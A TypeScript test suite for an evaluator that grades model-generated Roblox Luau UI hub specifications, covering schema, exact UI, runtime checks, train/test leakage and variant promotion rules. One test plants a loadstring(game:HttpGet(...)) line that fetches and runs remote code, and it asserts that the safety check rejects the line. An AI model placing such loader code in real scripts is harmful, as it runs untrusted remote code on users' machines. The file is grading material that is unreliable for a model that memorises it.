import assert from "node:assert/strict";
import test from "node:test";
import { buildRows } from "./dataset/fixtures.ts";
import { evaluate, evaluateCandidate, inferenceMessages, leakageAudit, parseCandidates, parseCases, parseRuntimeObservations, type Candidate, type EvaluationCase } from "./evaluate.ts";

const rows=buildRows();
const fixture=():EvaluationCase=>structuredClone(rows.test[0]);
const output=(row:EvaluationCase,variant:Candidate["variant"]="base"):Candidate=>({id:row.id,variant,output:JSON.stringify(row.expected.composition),stoppedWithEos:true});
const mutate=(callback:(spec:EvaluationCase["expected"]["composition"])=>void)=>{
  const row=fixture(),spec=structuredClone(row.expected.composition);callback(spec);
  return evaluateCandidate(row,{...output(row),output:JSON.stringify(spec)},"base");
};

test("full original fixture passes static and actual closed Luau runtime gates",()=>{
  const row=fixture(),result=evaluateCandidate(row,output(row),"base");
  assert.equal(result.passed,true);assert.equal(result.functionalPassed,true);
  assert.equal(result.referenceStrictPassed,true);assert.ok(result.runtime?.passed);
  assert.ok(result.features.every(feature=>feature.assessed && feature.passed));
  assert.equal(result.costUsd,null);
});

test("syntactically different equivalent callback passes functional gate and fails v1 diagnostic",()=>{
  const result=mutate(spec=>{
    const item=spec.pages.flatMap(page=>page.items).find(item=>item.featureIds.includes("camera-fov"));
    assert.ok(item && "code" in item);item.code='local current = workspace.CurrentCamera\nif current then current.FieldOfView = ctx.value else ctx.notify("Camera is unavailable.") end';
  });
  assert.equal(result.passed,true);assert.equal(result.referenceStrictPassed,false);
  assert.ok(result.runtime?.checks.some(check=>check.name==="camera-fov changes current target property" && check.passed));
});

test("no-op custom callback cannot pass through labels, feature bindings or schema",()=>{
  const result=mutate(spec=>{
    const item=spec.pages.flatMap(page=>page.items).find(item=>item.featureIds.includes("camera-fov"));
    assert.ok(item && "code" in item);item.code='print("FOV set")';
  });
  assert.equal(result.checks.find(check=>check.id==="schema")?.passed,true);
  assert.equal(result.checks.find(check=>check.id==="controls")?.passed,true);
  assert.equal(result.checks.find(check=>check.id==="runtime")?.passed,false);
  assert.equal(result.features.find(feature=>feature.id==="camera-fov")?.passed,false);
  assert.equal(result.passed,false);
});

test("exact requested UI cannot be softened by a successful callback",()=>{
  for(const change of [
    (spec:EvaluationCase["expected"]["composition"])=>{spec.window.width+=1;},
    (spec:EvaluationCase["expected"]["composition"])=>{spec.window.palette.accent=[255,0,0];},
    (spec:EvaluationCase["expected"]["composition"])=>{spec.window.navigation=spec.window.navigation==="top"?"left":"top";},
    (spec:EvaluationCase["expected"]["composition"])=>{spec.pages.reverse();},
  ]) {
    const result=mutate(change);assert.equal(result.passed,false);
    assert.equal(result.checks.find(check=>check.id==="ui")?.passed,false);
  }
});

test("control labels, bounds and initial states remain exact requirements",()=>{
  for(const key of ["label","max","initial"] as const) {
    const result=mutate(spec=>{
      const item=spec.pages.flatMap(page=>page.items).find(item=>item.kind==="number");assert.ok(item?.kind==="number");
      if(key==="label")item.label="Other control";else item[key]+=1;
    });
    assert.equal(result.passed,false);assert.equal(result.checks.find(check=>check.id==="controls")?.passed,false);
  }
});

test("only explicitly requested descriptions are compared, runtime remains mandatory",()=>{
  const row=fixture(),user=row.messages.find(message=>message.role==="user")!;
  const payload=JSON.parse(user.content);
  for(const control of payload.requestedControls)delete control.description;
  user.content=JSON.stringify(payload);
  const spec=structuredClone(row.expected.composition);
  const item=spec.pages.flatMap(page=>page.items).find(item=>"description" in item)!;
  if("description" in item)item.description="A different clear English description.";
  const result=evaluateCandidate(row,{...output(row),output:JSON.stringify(spec)},"base");
  assert.equal(result.passed,true);assert.equal(result.referenceStrictPassed,false);
  const explicit=mutate(actual=>{const control=actual.pages.flatMap(page=>page.items).find(item=>"description" in item)!;if("description" in control)control.description="Changed requested description.";});
  assert.equal(explicit.checks.find(check=>check.id==="controls")?.passed,false);
});

test("empty or single-feature hubs fail completeness even when JSON is well formed",()=>{
  const empty=mutate(spec=>{for(const page of spec.pages)page.items=[];});
  assert.equal(empty.passed,false);assert.equal(empty.checks.find(check=>check.id==="coverage")?.passed,false);
  const one=mutate(spec=>{const first=spec.pages.flatMap(page=>page.items)[0];for(const page of spec.pages)page.items=page.items.filter(item=>item===first);});
  assert.equal(one.passed,false);assert.equal(one.checks.find(check=>check.id==="coverage")?.passed,false);
});

test("French UI, unexpected branding, disabled supported controls and loaders are rejected",()=>{
  const french=mutate(spec=>{spec.window.closeLabel="Fermer";});
  assert.equal(french.checks.find(check=>check.id==="language")?.passed,false);
  const branded=mutate(spec=>{spec.window.title="A7DEV";});
  assert.equal(branded.checks.find(check=>check.id==="identity")?.passed,false);
  const disabled=mutate(spec=>{const page=spec.pages.find(page=>page.items.length)!;const prior=page.items[0];page.items[0]={id:prior.id,featureIds:prior.featureIds,kind:"disabled",label:"Disabled control",reason:"This requested supported behavior was disabled."};});
  assert.equal(disabled.checks.find(check=>check.id==="coverage")?.passed,false);
  const loader=mutate(spec=>{const item=spec.pages.flatMap(page=>page.items).find(item=>"action" in item && item.action==="custom")!;if("code" in item)item.code='loadstring(game:HttpGet("https://example.invalid/x"))()';});
  assert.equal(loader.checks.find(check=>check.id==="safety-static")?.passed,false);
  assert.equal(loader.runtime,null);
});

test("missing inference, errors and invalid JSON retain paired denominators",()=>{
  const row=fixture(),report=evaluate([row],[output(row)],undefined,{runtime:"disabled",includeApi:true});
  assert.equal(report.variants.specialist.cases,1);assert.equal(report.variants.specialist.missingOutputs,1);
  assert.equal(report.variants.api?.cases,1);assert.equal(report.variants.api?.missingOutputs,1);
  assert.equal(report.variants.specialist.strictPassRate,0);
  assert.equal(evaluateCandidate(row,{...output(row),error:"provider limit"},"base").passed,false);
  for(const text of ["","{}","invalid",'{"window":']) {
    const result=evaluateCandidate(row,{...output(row),output:text},"base");
    assert.equal(result.passed,false);assert.equal(result.runtime,null);
    assert.equal(result.checks.find(check=>check.id==="schema")?.passed,false);
    assert.ok(result.features.every(feature=>!feature.assessed));
  }
});

test("EOS budget is independent of functional validity and never hidden",()=>{
  const row=fixture(),result=evaluateCandidate(row,{...output(row),stoppedWithEos:false},"base");
  assert.equal(result.functionalPassed,true);assert.equal(result.passed,false);
  assert.equal(result.completionStatus,"budget-exhausted");
  assert.equal(result.checks.find(check=>check.id==="runtime")?.passed,true);
  assert.equal(result.checks.find(check=>check.id==="completion-budget")?.passed,false);
});

test("absent runtime cannot be promoted, precomputed runtime must match candidate hash",()=>{
  const row=fixture(),candidate=output(row),actual=evaluateCandidate(row,candidate,"base");
  assert.ok(actual.runtime);
  const records=parseRuntimeObservations(JSON.stringify({reports:[{...actual.runtime,variant:"base"}]}));
  assert.equal(evaluateCandidate(row,candidate,"base",{runtime:records}).passed,true);
  records[0].sourceSha256="wrong";
  assert.equal(evaluateCandidate(row,candidate,"base",{runtime:records}).passed,false);
  const disabled=evaluateCandidate(row,candidate,"base",{runtime:"disabled"});
  assert.equal(disabled.passed,false);assert.equal(disabled.functionalPassed,false);
  assert.throws(()=>parseRuntimeObservations(JSON.stringify([...records,...records])),/Duplicate/);
});

test("dev and test cases parse, assistant answers stay out of inference and leakage is audited",()=>{
  for(const split of ["dev","test"] as const) {
    const row=rows[split][0];assert.equal(parseCases(JSON.stringify(row))[0].split,split);
    assert.ok(inferenceMessages(row).every(message=>message.role!=="assistant"));
    assert.equal(leakageAudit([row],rows.train).status,"clean");
  }
  const leaked={...fixture(),id:"train-leak",split:"train"};
  assert.equal(leakageAudit([fixture()],[leaked]).status,"detected");
  const report=evaluate([rows.dev[0]],[],rows.train,{runtime:"disabled"});
  assert.equal(report.promotion.eligible,false);assert.ok(report.promotion.reasons.some(reason=>reason.includes("test-split")));
});

test("optional measured API variant shares exact case denominators and invalid identifiers reject",()=>{
  const row=fixture(),result=evaluateCandidate(row,output(row,"api"),"api");assert.ok(result.runtime);
  const runtime=[{...result.runtime,variant:"api" as const},{...result.runtime,variant:"base" as const},{...result.runtime,variant:"specialist" as const}];
  const report=evaluate([row],[output(row),output(row,"specialist"),output(row,"api")],rows.train,{runtime});
  assert.equal(report.variants.api?.strictPassRate,1);assert.equal(report.comparison.api?.acceptedRateDelta,0);
  assert.equal(report.promotion.eligible,false);assert.equal(report.comparison.conclusion,"superiority-not-established");
  assert.throws(()=>evaluate([row],[{...output(row),id:"missing"}],undefined,{runtime:"disabled"}),/unknown/);
  assert.throws(()=>parseCandidates(JSON.stringify(output(row))+"\n"+JSON.stringify(output(row))),/Duplicate/);
  assert.equal(parseCandidates(JSON.stringify(output(row,"api")))[0].variant,"api");
});

test("promotion needs twelve distinct final cases, complete comparators and a measured quality gain",()=>{
  // Reference outputs exercise the evaluator gate only; they are never inference evidence.
  const final=rows.test.slice(0,12);
  const candidates=final.flatMap(row=>[
    {...output(row),output:"{}"},output(row,"specialist"),{...output(row,"api"),output:"{}"},
  ]);
  const report=evaluate(final,candidates,rows.train);
  assert.equal(report.promotion.eligible,true);
  assert.equal(report.variants.specialist.strictPasses,12);assert.equal(report.variants.api?.strictPasses,0);
  const repeated=Array.from({length:12},(_,index)=>({...fixture(),id:`duplicate-${index}`}));
  const duplicateCandidates=repeated.flatMap(row=>[...(["base","specialist","api"] as const).map(variant=>output(row,variant))]);
  const denied=evaluate(repeated,duplicateCandidates,rows.train,{runtime:"disabled"});
  assert.equal(denied.promotion.eligible,false);assert.ok(denied.promotion.reasons.includes("Final inference prompts must be distinct"));
  const missing=evaluate(final,candidates.filter(candidate=>candidate.variant!=="api"),rows.train,{runtime:"disabled",includeApi:true});
  assert.equal(missing.promotion.eligible,false);assert.equal(missing.variants.api?.missingOutputs,12);
});
